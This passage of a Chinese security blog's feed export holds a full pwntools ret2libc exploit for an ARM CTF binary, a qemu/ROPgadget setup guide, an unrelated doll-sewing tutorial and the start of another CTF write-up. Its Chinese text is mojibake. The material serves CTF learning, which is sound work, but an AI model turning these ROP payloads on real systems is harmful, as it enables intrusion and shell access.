æ­¤å¦‚æœæœ¬åœ°æ‰“é€šåå¦‚æœå’Œè¿œç¨‹é¶æœºä½¿ç”¨çš„<code>libc</code>ä¸åŒï¼Œä¸ä»…éœ€è¦æ”¹expä¸­æŒ‡ä»¤åœ¨<code>libcçš„åç§»</code>ï¼Œè¿˜éœ€è¦ä¿®æ”¹å¡«å……çš„<code>junkæ•°é‡</code></p></blockquote><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;arm&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">elf = ELF(<span class="string">&#x27;./login_system&#x27;</span>)</span><br><span class="line">p = process([<span class="string">&#x27;qemu-arm&#x27;</span>, <span class="string">&#x27;-L&#x27;</span>, <span class="string">&#x27;./glibc-2.27&#x27;</span>,<span class="string">&#x27;-g&#x27;</span>,<span class="string">&#x27;11452&#x27;</span>, <span class="string">&#x27;login_system&#x27;</span>])</span><br><span class="line"><span class="comment"># HOST = &#x27;123.56.252.211&#x27;</span></span><br><span class="line"><span class="comment"># PORT = 13761</span></span><br><span class="line"><span class="comment"># p = remote(HOST, PORT)</span></span><br><span class="line"></span><br><span class="line">gdb.attach(target=(<span class="string">&quot;localhost&quot;</span>, <span class="number">11452</span>), exe=elf.path)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">260</span></span><br><span class="line">main_addr = <span class="number">0x000106ac</span></span><br><span class="line">pop_r3_pc = <span class="number">0x000103f0</span>          <span class="comment"># pop &#123;r3, pc&#125;</span></span><br><span class="line">mov_r0_r3_pop_fp_pc = <span class="number">0x000106c0</span> <span class="comment"># mov r0, r3 ; pop &#123;fp, pc&#125;</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span> * offset</span><br><span class="line">payload1 += p32(pop_r3_pc)              <span class="comment"># æ§åˆ¶ r3 å’Œ pc</span></span><br><span class="line">payload1 += p32(elf.got[<span class="string">&#x27;puts&#x27;</span>])        <span class="comment"># r3 = puts@got</span></span><br><span class="line">payload1 += p32(mov_r0_r3_pop_fp_pc)    <span class="comment"># pc -&gt; gadget, æ‰§è¡Œ mov r0, r3</span></span><br><span class="line">payload1 += <span class="string">b&#x27;junk&#x27;</span>                     <span class="comment"># fp çš„å¡«å……å€¼</span></span><br><span class="line">payload1 += p32(elf.plt[<span class="string">&#x27;puts&#x27;</span>])        <span class="comment"># pc -&gt; puts@plt, æ‰§è¡Œ puts(r0)</span></span><br><span class="line">payload1 += <span class="string">b&#x27;junk&#x27;</span> * <span class="number">5</span>                <span class="comment"># æ ¹æ®libcå¡«å……ä¸åŒæ•°é‡çš„junk</span></span><br><span class="line">payload1 += p32(main_addr)  </span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Username: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;admin&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Password: &#x27;</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Wrong Password!\n&#x27;</span>)</span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">log.success(<span class="string">f&#x27;Leaked puts address: <span class="subst">&#123;<span class="built_in">hex</span>(puts_addr)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">log.success(<span class="string">f&#x27;Libc base address: <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&#x27;</span>)</span><br><span class="line">log.success(<span class="string">f&#x27;System address: <span class="subst">&#123;<span class="built_in">hex</span>(system_addr)&#125;</span>&#x27;</span>)</span><br><span class="line">log.success(<span class="string">f&#x27;&quot;/bin/sh&quot; address: <span class="subst">&#123;<span class="built_in">hex</span>(bin_sh_addr)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span> * offset</span><br><span class="line">payload2 += p32(pop_r3_pc)              <span class="comment"># æ§åˆ¶ r3 å’Œ pc</span></span><br><span class="line">payload2 += p32(bin_sh_addr)            <span class="comment"># r3 = &amp;&quot;/bin/sh&quot;</span></span><br><span class="line">payload2 += p32(mov_r0_r3_pop_fp_pc)    <span class="comment"># pc -&gt; gadget, æ‰§è¡Œ mov r0, r3</span></span><br><span class="line">payload2 += <span class="string">b&#x27;junk&#x27;</span> * <span class="number">1</span>                 <span class="comment"># fp çš„å¡«å……å€¼ (4 bytes)</span></span><br><span class="line">payload2 += p32(system_addr)            <span class="comment"># pc -&gt; system, æ‰§è¡Œ system(r0)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Username: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;admin&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Password: &#x27;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><strong>getshell</strong></p><p><img src="/2025/10/16/yigou-pwn2/image-20251016171312322.png" alt="image-20251016171312322"></p>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> å¼‚æ„PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¼‚æ„PWN(1)-åˆæ¢</title>
      <link href="/2025/10/16/yigou-pwn1/"/>
      <url>/2025/10/16/yigou-pwn1/</url>
      
        <content type="html"><![CDATA[<blockquote><p>ä¸€äº›åœ¨å¼‚æ„PWNä¸­æ¯”è¾ƒå…·æœ‰å…±æ€§çš„æ“ä½œå’Œé—®é¢˜ä¼šåœ¨æ­¤å¤„è®°å½•</p></blockquote><h2 id="åŸºæœ¬å·¥å…·å®‰è£…"><a href="#åŸºæœ¬å·¥å…·å®‰è£…" class="headerlink" title="åŸºæœ¬å·¥å…·å®‰è£…"></a>åŸºæœ¬å·¥å…·å®‰è£…</h2><h2 id="qemuå®‰è£…"><a href="#qemuå®‰è£…" class="headerlink" title="qemuå®‰è£…"></a>qemuå®‰è£…</h2><p>å®‰è£…<code>qemu qemu-user qemu-user-static</code><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sudo</span> apt-get install qemu qemu-user qemu-user-static</span><br></pre></td></tr></table></figure><br>å®‰è£…<code>qemu-system</code><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get install qemu-system uml-utilities bridge-utils</span><br></pre></td></tr></table></figure></p><ul><li>qemu-usr ï¼šæŒ‡å®šåŠ¨æ€é“¾æ¥åº“è¿è¡Œ<ul><li>å®‰è£…åŠ¨æ€é“¾æ¥åº“<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo apt search <span class="string">&quot;libc6&quot;</span> | grep arm</span><br><span class="line">$ sudo apt install libc6-armel-cross  <span class="comment">#å¯¹åº”arm32</span></span><br><span class="line">$ sudo apt install libc6-dbg-arm64-cross <span class="comment">#å¯¹åº”arm64</span></span><br></pre></td></tr></table></figure></li></ul></li></ul><blockquote><p>å¦‚æœéœ€è¦<strong>å®‰è£…å…¶ä»–ç‰ˆæœ¬</strong>çš„åŠ¨æ€é“¾æ¥åº“ï¼Œ<br>å¯ä»¥åœ¨ <a href="http://ports.ubuntu.com/pool/main/g/glibc/">http://ports.ubuntu.com/pool/main/g/glibc/</a> ä¸­é€‰æ‹©ç›¸åº”æ¶æ„å’Œç‰ˆæœ¬ä¸‹è½½</p></blockquote><ul><li>qemu-user-static ï¼šåŒ…å«äº†æ‰€æœ‰å¿…éœ€çš„åº“å’ŒäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œè¿è¡Œé™æ€é“¾æ¥çš„ç¨‹åº</li><li>qemu-system ï¼š æ¨¡æ‹Ÿæ•´ä¸ªè®¡ç®—æœºç³»ç»Ÿçš„è·¨å¹³å°è¿è¡Œ<h3 id="è°ƒè¯•å·¥å…·å®‰è£…"><a href="#è°ƒè¯•å·¥å…·å®‰è£…" class="headerlink" title="è°ƒè¯•å·¥å…·å®‰è£…"></a>è°ƒè¯•å·¥å…·å®‰è£…</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install gdb-multiarch</span><br></pre></td></tr></table></figure>åŠ¨æ€é“¾æ¥åº“å†²çªï¼š<code>set sysroot libè·¯å¾„</code></li></ul><h2 id="ä¸€äº›é—®é¢˜ä¸è§£å†³æ–¹æ¡ˆ"><a href="#ä¸€äº›é—®é¢˜ä¸è§£å†³æ–¹æ¡ˆ" class="headerlink" title="ä¸€äº›é—®é¢˜ä¸è§£å†³æ–¹æ¡ˆ"></a>ä¸€äº›é—®é¢˜ä¸è§£å†³æ–¹æ¡ˆ</h2><h3 id="ROPgadgetæŠ¥é”™"><a href="#ROPgadgetæŠ¥é”™" class="headerlink" title="ROPgadgetæŠ¥é”™"></a>ROPgadgetæŠ¥é”™</h3><p>åœ¨æŸ¥æ‰¾<code>å¼‚æ„</code>äºŒè¿›åˆ¶æ–‡ä»¶çš„<code>gadget</code>æ—¶ï¼Œä¸ç®¡æ˜¯<code>arm</code>è¿˜æ˜¯<code>risc-v</code>ï¼Œ <code>ROPgadget</code>ä¼šæŠ¥ç±»ä¼¼å¦‚ä¸‹é”™è¯¯ï¼š<br><img src="/2025/10/16/yigou-pwn1/Pasted image 20251015223525.png" alt="Pasted image 20251015223525" style="zoom:50%;"></p><p>æŠ¥é”™1ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">NameError: name <span class="string">&#x27;CS_ARCH_ARM64&#x27;</span> is not defined. Did you mean: <span class="string">&#x27;CS_ARCH_ARM&#x27;</span>?</span><br></pre></td></tr></table></figure><p>æŠ¥é”™2ï¼š<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">NameError: name <span class="string">&#x27;CS_ARCH_RISCV&#x27;</span> is not defined. Did you mean: <span class="string">&#x27;CS_ARCH_MIPS&#x27;</span>?</span><br></pre></td></tr></table></figure><br>ç»è¿‡å°è¯•ï¼Œæ˜¯å› ä¸º <code>ROPgadget</code> å’Œ <code>Capstone</code> ç‰ˆæœ¬å…¼å®¹æ€§é—®é¢˜å¯¼è‡´çš„ï¼š</p><ul><li>æœ€æ–°çš„<code>Capstone 6.x</code> åŒæ—¶äº§ç”ŸæŠ¥é”™1å’ŒæŠ¥é”™2</li><li><code>apt install python3-capstone</code> ä¸‹è½½çš„<code>Capstone 4.x</code> ä¸äº§ç”ŸæŠ¥é”™1ï¼Œäº§ç”ŸæŠ¥é”™2</li></ul><p>æœ€ç»ˆå‘ç° <code>ROPgadget v7.7</code> å’Œ <code>Capstone 5.0.6</code>æ˜¯ç¬”è€…å‘ç°è¾ƒæ–°ä¸”å…¼å®¹æ€§è¾ƒå¥½çš„ç‰ˆæœ¬<br>å»ºè®®å®Œå…¨å¸è½½å½“å‰çš„ <code>ROPgadget</code> å’Œ <code>Capstone</code> ï¼Œé‡‡ç”¨å®˜æ–¹å®‰è£…æ–¹å¼</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ pip uninstall capstone ROPgadget -y</span><br><span class="line">$ sudo apt install python3-pip</span><br><span class="line">$ sudo -H python3 -m pip install ROPgadget</span><br><span class="line">$ ROPgadget --<span class="built_in">help</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> å¼‚æ„PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å…³èŠ‚ç©å¶åˆ¶ä½œå…¨æµç¨‹</title>
      <link href="/2025/10/03/handmade1/"/>
      <url>/2025/10/03/handmade1/</url>
      
        <content type="html"><![CDATA[<h2 id="é›¶ã€èµ°é©¬ç¯"><a href="#é›¶ã€èµ°é©¬ç¯" class="headerlink" title="é›¶ã€èµ°é©¬ç¯"></a>é›¶ã€èµ°é©¬ç¯</h2><ul><li>ç”±äºç›´æ¥è´­ä¹°ç©å¶çš„ä»·æ ¼æœ‰ç‚¹è¿‡äº<code>expensive</code>äº†ï¼Œå¹²è„†å°±ä¹°äº†ä¸€å¥—å·¥å…·è‡ªå·±ç¼ï¼Œ<code>1/5</code>çš„ä»·æ ¼</li><li>æœ¬æ¥æ‰“ç®—å‡æœŸæ¯å¤©åšä¸€ç‚¹ï¼Œå›½åº†ç»“æŸæ­£å¥½å®Œå·¥ã€‚ç„¶è€Œ<code>10æœˆ2å·</code>ä¸Šåˆè¢«<code>ç¥å¿…å®‰å“é€†å‘</code>å“æ™•ï¼Œé†’è¿‡æ¥ä¹‹åä¸æƒ³ç¢°ç”µè„‘äº†ï¼Œ<code>14:00</code>å¼€å§‹åšï¼Œ<code>23:15</code>å°±åšå®Œäº†ï¼Œ<strong>9å°æ—¶æ— ä¼¤é€šå…³é’ˆçº¿æ´»</strong>ï¼Œéš¾é“æˆ‘çœŸæ˜¯å¤©æ‰ï¼Ÿ</li></ul><blockquote><p>äºæ˜¯æ­£å¥½å’Œä¹‹å‰çš„å¨ƒå¨ƒç»„æˆäº†ã€Œæçº¿çš„æœ¬æˆ‘ Â· ä½é…ç‰ˆã€ï¼Œè¦ç´ è¿˜æ˜¯æ¯”è¾ƒé½å…¨çš„<img src="/2025/10/03/handmade1/IMG_20251004_135428.jpg" alt="IMG_20251004_135428" style="zoom: 33%;"></p></blockquote><h2 id="ä¸€ã€ææ–™-amp-å·¥å…·-é…ç½®"><a href="#ä¸€ã€ææ–™-amp-å·¥å…·-é…ç½®" class="headerlink" title="ä¸€ã€ææ–™ &amp; å·¥å…· é…ç½®"></a>ä¸€ã€ææ–™ &amp; å·¥å…· é…ç½®</h2><h3 id="1-ææ–™"><a href="#1-ææ–™" class="headerlink" title="1. ææ–™"></a>1. ææ–™</h3><p><strong>æ ¸å¿ƒå‡ºè£…</strong>ï¼šä¸€å—å¸ƒ &amp; çº¿ &amp; ä¸€è¢‹æ£‰èŠ±</p><p><img src="/2025/10/03/handmade1/IMG_20251003_001149.jpg" alt="IMG_20251003_001149" style="zoom: 33%;"></p><p><strong>é…ä»¶</strong>ï¼šçœ¼ç  &amp; é¼»å­ &amp; å…³èŠ‚ç‰‡</p><blockquote><p>é…ä»¶ä¹°ç°æˆçš„å°±å¥½</p></blockquote><h3 id="2-å·¥å…·"><a href="#2-å·¥å…·" class="headerlink" title="2. å·¥å…·"></a>2. å·¥å…·</h3><p><img src="/2025/10/03/handmade1/image-20251003114950677.png" alt="image-20251003114950677" style="zoom:33%;"></p><ul><li><strong>é’ˆçº¿åŒ…</strong>ï¼šç¼åˆ</li><li><strong>çƒ­æ¶ˆç¬”</strong>ï¼šè’™ç‰ˆç”»çº¿ï¼Œç”µå¹é£ä¸€å¹é¢œè‰²å°±æ¶ˆå¤±äº†</li><li><strong>å‰ªåˆ€</strong>ï¼šè£å¸ƒæ–™</li><li><strong>é•Šå­</strong>ï¼šå……æ£‰</li><li><strong>è€è™é’³</strong>ï¼šæ‹§å…³èŠ‚ç‰‡</li><li><strong>å®šä½é’ˆ</strong>ï¼šè¾…åŠ©å®šä½ï¼Œé˜²æ­¢ç¼æ­ª</li><li><strong>å¢é‡ç </strong>ï¼šå¢åŠ èº«ä½“é‡é‡ï¼Œè€³æœµæ¶æ„Ÿ</li><li><strong>é…’ç²¾èƒ¶</strong>ï¼šåŠ å›ºè´è¶ç»“ã€é¼»å­</li><li><strong>é’¢åˆ·</strong>ï¼šåˆ·æ¯›ï¼Œæ©ç›–æ‰‹ä½œç—•è¿¹</li></ul><h2 id="äºŒã€å‰ç½®çŸ¥è¯†"><a href="#äºŒã€å‰ç½®çŸ¥è¯†" class="headerlink" title="äºŒã€å‰ç½®çŸ¥è¯†"></a>äºŒã€å‰ç½®çŸ¥è¯†</h2><h3 id="ç©¿é’ˆ-amp-æ‰“ç»“"><a href="#ç©¿é’ˆ-amp-æ‰“ç»“" class="headerlink" title="ç©¿é’ˆ &amp; æ‰“ç»“"></a>ç©¿é’ˆ &amp; æ‰“ç»“</h3><p>å‚è€ƒæ•™ç¨‹ï¼š<a href="https://zh.wikihow.com/ç©¿é’ˆå’Œæ‰“ç»“#">å¦‚ä½•ç©¿é’ˆå’Œæ‰“ç»“: 14 æ­¥éª¤</a></p><blockquote><p>ç¬”è€…è¿™é‡Œå»ºè®®æ‰“ç»“æ—¶è‡³å°‘ç»•3~4ä¸ªçº¿åœˆï¼Œä¸ç„¶ç¿»é¢æ—¶å¾ˆå®¹æ˜“å´©å¼€</p></blockquote><h3 id="å¹³é’ˆæ³•ï¼ˆåŸºæœ¬ç¼åˆï¼‰"><a href="#å¹³é’ˆæ³•ï¼ˆåŸºæœ¬ç¼åˆï¼‰" class="headerlink" title="å¹³é’ˆæ³•ï¼ˆåŸºæœ¬ç¼åˆï¼‰"></a>å¹³é’ˆæ³•ï¼ˆåŸºæœ¬ç¼åˆï¼‰</h3><p>ä¸¤å—å¸ƒæ–™è´´åˆï¼Œä»èƒŒé¢è¿›é’ˆï¼Œæ­£é¢å‡ºé’ˆï¼Œç„¶åæŒ‰ç€æ–¹å‘ç©¿å›å»ï¼Œé’ˆä¸€ä¸Šä¸€ä¸‹å¹³ç¨³ç¼çº«ï¼Œé’ˆè·æ§åˆ¶åœ¨0.2è‡³0.3å˜ç±³ä¹‹é—´</p><h3 id="è—é’ˆæ³•ï¼ˆæ”¶å£-amp-è¿æ¥ï¼‰"><a href="#è—é’ˆæ³•ï¼ˆæ”¶å£-amp-è¿æ¥ï¼‰" class="headerlink" title="è—é’ˆæ³•ï¼ˆæ”¶å£ &amp; è¿æ¥ï¼‰"></a>è—é’ˆæ³•ï¼ˆæ”¶å£ &amp; è¿æ¥ï¼‰</h3><p>åœ¨ä¸¤å—å¸ƒçš„å¯¹åº”ä½ç½®åˆ†åˆ«ç¼åˆä¸€é’ˆã€‚å½“çº¿è¢«æ‹‰ç´§æ—¶ï¼Œè¿™ä¸¤å—å¸ƒä¼šç´§å¯†åœ°è´´åˆåœ¨ä¸€èµ·ï¼Œä½¿å¾—ç¼çº¿å®Œå…¨éšè—ï¼Œçœ‹ä¸åˆ°ä»»ä½•ç—•è¿¹ã€‚è¿™ç§é’ˆæ³•åœ¨ç¼åˆè¿”å£æ—¶éå¸¸å®ç”¨ï¼Œèƒ½å¤Ÿç¡®ä¿ç¼åˆå¤„çš„å®Œç¾æ— ç¼ã€‚</p><h2 id="ä¸‰ã€åˆ¶ä½œè¿‡ç¨‹"><a href="#ä¸‰ã€åˆ¶ä½œè¿‡ç¨‹" class="headerlink" title="ä¸‰ã€åˆ¶ä½œè¿‡ç¨‹"></a>ä¸‰ã€åˆ¶ä½œè¿‡ç¨‹</h2><h3 id="0-æ¢¦å¼€å§‹çš„åœ°æ–¹"><a href="#0-æ¢¦å¼€å§‹çš„åœ°æ–¹" class="headerlink" title="0. æ¢¦å¼€å§‹çš„åœ°æ–¹"></a>0. æ¢¦å¼€å§‹çš„åœ°æ–¹</h3><p><img src="/2025/10/03/handmade1/image-20251003115138605.png" alt="image-20251003115138605" style="zoom:50%;"></p><h3 id="1-çƒ­æ¶ˆç¬”ç”»çº¿"><a href="#1-çƒ­æ¶ˆç¬”ç”»çº¿" class="headerlink" title="1. çƒ­æ¶ˆç¬”ç”»çº¿"></a>1. çƒ­æ¶ˆç¬”ç”»çº¿</h3><p><img src="/2025/10/03/handmade1/image-20251003115039498.png" alt="image-20251003115039498"></p><h3 id="2-è£å‰ª"><a href="#2-è£å‰ª" class="headerlink" title="2. è£å‰ª"></a>2. è£å‰ª</h3><p><img src="/2025/10/03/handmade1/image-20251003115223648.png" alt="image-20251003115223648" style="zoom: 33%;"></p><h3 id="3-åŸºæœ¬ç¼åˆ"><a href="#3-åŸºæœ¬ç¼åˆ" class="headerlink" title="3. åŸºæœ¬ç¼åˆ"></a>3. åŸºæœ¬ç¼åˆ</h3><p>ç•™å‡ºåå£ï¼Œå…¶ä½™éƒ¨åˆ†ç¼åˆ</p><p><img src="/2025/10/03/handmade1/image-20251003115403605.png" alt="image-20251003115403605" style="zoom:33%;"><img src="/2025/10/03/handmade1/image-20251003115417525.png" alt="image-20251003115417525" style="zoom:33%;"></p><h3 id="4-å…³èŠ‚åˆ¶ä½œ-amp-å……æ£‰"><a href="#4-å…³èŠ‚åˆ¶ä½œ-amp-å……æ£‰" class="headerlink" title="4. å…³èŠ‚åˆ¶ä½œ &amp; å……æ£‰"></a>4. å…³èŠ‚åˆ¶ä½œ &amp; å……æ£‰</h3><p>é€šè¿‡åå£æŠŠæ­£é¢ç¿»å‡ºæ¥ï¼Œç„¶åé€šè¿‡<code>è€è™é’³</code>è¾…åŠ©<code>åˆ¶ä½œå…³èŠ‚</code>,<code>é•Šå­</code>è¾…åŠ©<code>å……æ£‰</code></p><p><img src="/2025/10/03/handmade1/image-20251003115552394.png" alt="image-20251003115552394" style="zoom:33%;"><img src="/2025/10/03/handmade1/image-20251003115945638.png" alt="image-20251003115945638" style="zoom:33%;"></p><p><img src="/2025/10/03/handmade1/image-20251003120016707.png" alt="image-20251003120016707" style="zoom:50%;"></p><h3 id="5-å¤´éƒ¨åˆ¶ä½œ"><a href="#5-å¤´éƒ¨åˆ¶ä½œ" class="headerlink" title="5. å¤´éƒ¨åˆ¶ä½œ"></a>5. å¤´éƒ¨åˆ¶ä½œ</h3><p><img src="/2025/10/03/handmade1/image-20251003120559205.png" alt="image-20251003120559205" style="zoom: 33%;"></p><h4 id="åŸºæœ¬æ“ä½œ"><a href="#åŸºæœ¬æ“ä½œ" class="headerlink" title="åŸºæœ¬æ“ä½œ"></a>åŸºæœ¬æ“ä½œ</h4><p>å’Œå››è‚¢ç±»ä¼¼ï¼Œå……æ£‰ +å…³èŠ‚</p><h4 id="è€³æœµ"><a href="#è€³æœµ" class="headerlink" title="è€³æœµ"></a>è€³æœµ</h4><p>å…ˆæŠŠè€³æœµç¼åˆ°å¤´ä¸Šï¼Œç„¶åè´´è´è¶ç»“</p><h4 id="çœ¼ç›ï¼ˆç”¨çº¿æ‹‰å‡ºçœ¼çªï¼‰"><a href="#çœ¼ç›ï¼ˆç”¨çº¿æ‹‰å‡ºçœ¼çªï¼‰" class="headerlink" title="çœ¼ç›ï¼ˆç”¨çº¿æ‹‰å‡ºçœ¼çªï¼‰"></a>çœ¼ç›ï¼ˆç”¨çº¿æ‹‰å‡ºçœ¼çªï¼‰</h4><p><strong>ç”¨æœ€é•¿æœ€ç²—çš„é’ˆ</strong>ï¼Œ<strong>å–æ¯”è¾ƒé•¿çš„çº¿</strong>æ‹‰å‡ºçœ¼çªï¼Œç„¶åå®‰è£…çœ¼ç›</p><h4 id="é¼»å­"><a href="#é¼»å­" class="headerlink" title="é¼»å­"></a>é¼»å­</h4><p>é¼»å­æ‰è¿›å»å¾ˆå®¹æ˜“æ‰ï¼Œç”¨<code>é…’ç²¾èƒ¶</code>åŠ å›º</p><h3 id="6-ç»„è£…"><a href="#6-ç»„è£…" class="headerlink" title="6. ç»„è£…"></a>6. ç»„è£…</h3><p><img src="/2025/10/03/handmade1/image-20251003120109196.png" alt="image-20251003120109196" style="zoom:50%;"></p><h2 id="å››ã€æˆå“å±•ç¤º"><a href="#å››ã€æˆå“å±•ç¤º" class="headerlink" title="å››ã€æˆå“å±•ç¤º"></a>å››ã€æˆå“å±•ç¤º</h2><p><img src="/2025/10/03/handmade1/image-20251003120638067.png" alt="image-20251003120638067" style="zoom:50%;"></p><h2 id="äº”ã€ä¸‹æœŸé¢„å‘Š"><a href="#äº”ã€ä¸‹æœŸé¢„å‘Š" class="headerlink" title="äº”ã€ä¸‹æœŸé¢„å‘Š"></a>äº”ã€ä¸‹æœŸé¢„å‘Š</h2><p><img src="/2025/10/03/handmade1/image-20251003120850138.png" alt="image-20251003120850138" style="zoom:50%;"></p>]]></content>
      
      
      <categories>
          
          <category> æ‰‹å·¥ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ‰‹å·¥ </tag>
            
            <tag> å…³èŠ‚ç©å¶ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ±Ÿè‹ç§»åŠ¨â€œèµ‹èƒ½å»ºåŠŸâ€-äºŒè¿›åˆ¶ç›¸å…³</title>
      <link href="/2025/09/17/yi-dong-Binary/"/>
      <url>/2025/09/17/yi-dong-Binary/</url>
      
        <content type="html"><![CDATA[<h1 id="æ±Ÿè‹ç§»åŠ¨â€œèµ‹èƒ½å»ºåŠŸâ€-äºŒè¿›åˆ¶ç›¸å…³"><a href="#æ±Ÿè‹ç§»åŠ¨â€œèµ‹èƒ½å»ºåŠŸâ€-äºŒè¿›åˆ¶ç›¸å…³" class="headerlink" title="æ±Ÿè‹ç§»åŠ¨â€œèµ‹èƒ½å»ºåŠŸâ€-äºŒè¿›åˆ¶ç›¸å…³"></a>æ±Ÿè‹ç§»åŠ¨â€œèµ‹èƒ½å»ºåŠŸâ€-äºŒè¿›åˆ¶ç›¸å…³</h1><h2 id="PWN-å·²å®Œæˆ"><a href="#PWN-å·²å®Œæˆ" class="headerlink" title="PWN(å·²å®Œæˆ)"></a>PWN(å·²å®Œæˆ)</h2><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p><img src="/2025/09/17/yi-dong-Binary/image-20250917181234932.png" alt="image-20250917181234932" style="zoom:50%;"></p><blockquote><p>32ä½çš„ï¼Œå¥½å¤è€çš„ç¨‹åºï¼Œæ±Ÿè‹ç§»åŠ¨æ‰¾çš„å‡ºé¢˜äººä¸ä¼šæ˜¯å“ªé‡ŒæŠ„çš„å§ã€‚ã€‚ã€‚</p></blockquote><ul><li>å¼€å¯Cannaryï¼Œæ²¡å¼€PIEï¼›</li><li>RELROéƒ¨åˆ†å¼€:GOTè¡¨å¯è¢«è¦†ç›–</li></ul><p><img src="/2025/09/17/yi-dong-Binary/image-20250917182043333.png" alt="image-20250917182043333" style="zoom:50%;"></p><p>ğŸ‘†ä¸€å¼€å§‹ä»£ç å¾ˆä¹±ï¼Œscanfæ˜¾ç„¶å¤šä¼ äº†æ— ç”¨å‚æ•°ï¼Œåªæœ‰å‰ä¸¤ä¸ªå‚æ•°æœ‰æ•ˆï¼Œå±äºåç¼–è¯‘äº§ç”Ÿçš„å™ªéŸ³ï¼Œäººå·¥ä¼˜åŒ–ä¸€ä¸‹ğŸ‘‡</p><p><img src="/2025/09/17/yi-dong-Binary/image-20250917184239673.png" alt="image-20250917184239673" style="zoom:50%;"></p><p><img src="/2025/09/17/yi-dong-Binary/image-20250917185031197.png" alt="image-20250917185031197" style="zoom:50%;"></p><p>æ˜æ˜¾å¯ä»¥å®¡åˆ°åˆ©ç”¨ç‚¹å¦‚ä¸‹ï¼š</p><ul><li>ç¬¬1æ¬¡è¾“å…¥ï¼š<code>read(0, buf, 81u);</code> <code>off_by_one</code> ç»“åˆä¸‹é¢çš„<code>printf</code>æ³„éœ²<code>canary</code></li><li>ç¬¬2æ¬¡è¾“å…¥ï¼š<code>printf</code>çš„idxå¯ä»¥æ•°ç»„è´Ÿæ•°è¶Šç•Œè·å–<code>got</code>è¡¨ä¿¡æ¯</li><li>ç¬¬3æ¬¡è¾“å…¥ï¼šå¾€bssæ®µä¸Šå¸ƒç½®ä¸œè¥¿</li><li>ç¬¬4æ¬¡è¾“å…¥ï¼šæ­£å¥½æ§åˆ°ebpï¼Œå¯ä»¥æ ˆè¿ç§»ï¼Œæ§åˆ¶ç¨‹åºæµ</li></ul><p>æˆ‘ä»¬å¯ä»¥æ³„éœ²<code>canary</code>å€¼ï¼Œå†é€šè¿‡æ•°ç»„è´Ÿæ•°è¶Šç•Œè·å–<code>got</code>è¡¨ä¿¡æ¯ï¼Œè®¡ç®—å‡º<code>onegadget</code>ï¼Œæœ€ååˆ©ç”¨<code>æ ˆè¿ç§»</code>ï¼Œå°†æ ˆè¿ç§»åˆ°æˆ‘ä»¬è®¾è®¡å¥½çš„<code>bss</code>æ®µä¸­ï¼Œè§¦å‘<code>onegadget</code>ï¼Œè·å–shellã€‚</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># use recv with a small timeout instead of print p.read()</span></span><br><span 